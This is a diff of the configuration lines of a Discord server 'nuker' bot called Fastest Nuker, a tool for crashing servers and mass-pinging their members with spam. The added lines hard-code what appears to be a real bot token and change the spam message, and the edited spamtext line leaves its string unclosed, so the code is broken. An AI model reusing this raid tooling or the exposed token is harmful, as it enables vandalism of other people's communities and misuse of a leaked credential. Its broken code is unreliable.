@@ -5,9 +5,9 @@ from requests import put
 import discord
 from asyncio import create_task
 
-prefix = '!' # префикс нашего бота
-token = 'Bot token' # токен бота
-spamtext = '@everyone @here\nВас крашнул бот Fastest Nuker!\nИсходный код доступен на GitHub: https://github.com/forzel-new/fastestnuker\nDiscord сервер создателя: https://discord.gg/fzlgroup' # текст спама при краше
+prefix = 'mp.' # префикс нашего бота
+token = 'MTAxNzA4MzY3NDgwNzc3OTM1OA.GSxEos.cdp2KHqS3r3gPCj-upM_W_A_OE0wZj_krLr9e8' # токен бота
+spamtext = '@everyone @here\nВас крашнул бот Fastest Nuker!\n # текст спама при краше
 
 intents = Intents.default()
 intents.members = True
